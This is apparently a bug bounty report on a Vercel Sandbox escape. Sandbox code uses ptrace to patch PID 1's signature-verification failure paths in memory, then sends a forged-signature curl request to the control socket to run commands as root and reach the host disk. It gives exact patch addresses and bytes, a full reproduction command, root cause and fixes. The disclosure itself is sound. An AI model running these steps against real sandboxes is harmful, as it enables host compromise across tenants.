# Title
Vercel Sandbox escape (2): init.sock signature bypass → arbitrary root command execution

# Asset
Vercel Sandbox (HackerOne challenge)

# Severity
CRITICAL

# Weakness
CWE-347 Improper Verification of Cryptographic Signature

# Summary
User code inside a Vercel Sandbox can `ptrace` PID 1 (`sandbox-init`, owner of `/run/vercel/share/init.sock`), patch its ed25519 signature-check failure paths in memory, then call `SpawnService/Spawn` on the control socket with a **fake signature** to run arbitrary commands with full capabilities (CapEff=000001ffffffffff); spawned processes can `setuid(0)` to root and reach the host rootfs block device `/dev/vda` (see companion report).

# Steps To Reproduce
Run inside a sandbox (`python3 -c`):
1. `PTRACE_ATTACH(1)` → OK (no Yama restriction), `waitpid` → pid 1
2. `PTRACE_POKEDATA` patch 3 signature-verify failure branches to force `err=nil` (Go ABI: error in rax/rbx):
   `0x83b571/0x83b5af: 31c031db4881c4d00000005dc3` · `0x82a9f9: 31c031db4881c4900000005dc3` (non-PIE binary, fixed addresses)
3. Call the socket with arbitrary signature (64×0x99) + any timestamp:
   `curl --unix-socket /run/vercel/share/init.sock -H 'Content-Type: application/connect+json' -H 'Connect-Protocol-Version: 1' -H 'x-timestamp: <ms>' -H 'x-signature: <fake>' --data-binary $'\x00\x00\x00\x00\x27{"command":"id"}' http://localhost/vercel.sandbox.spawn.v1.SpawnService/Spawn`
   → `{"started":{"processId":"proc_3"}}` + `{"stdout":"<b64>uid=1000(vercel-sandbox)..."}` + `{"exit":{}}`
4. **Control** (no patch): identical request → `{"error":{"code":"unauthenticated","message":"invalid signature"}}`
5. Spawned process: `setuid(0)` OK (real root), `mount -t tmpfs` OK, `/dev/vda` O_RDWR OK (host rootfs)

# Impact
- Full sandbox escape: arbitrary code execution as the sandbox control process, full Linux capability set, `setuid(0)` root in the shared host kernel
- Direct read/write of the host rootfs block device `/dev/vda` (host bind-mount sources, celld configs, CA certs) — persistent, cross-sandbox host compromise
- Signature scheme bypassed at process level; no private key recovery needed

# Root cause
`sandbox-init` runs with full capabilities and is ptrace-able from sandbox code (no Yama/seccomp protection); its signature-verify failure paths are mutable memory with a deterministic, patchable return convention (Go register ABI).

# Suggested fix
- Block `PTRACE_ATTACH` on PID 1 from sandbox processes (Yama ptrace_scope / seccomp)
- Drop capabilities from `sandbox-init` to the minimum; hide block devices (device-cgroup)
- Verify signatures in a separate host-side, non-ptrace-able process
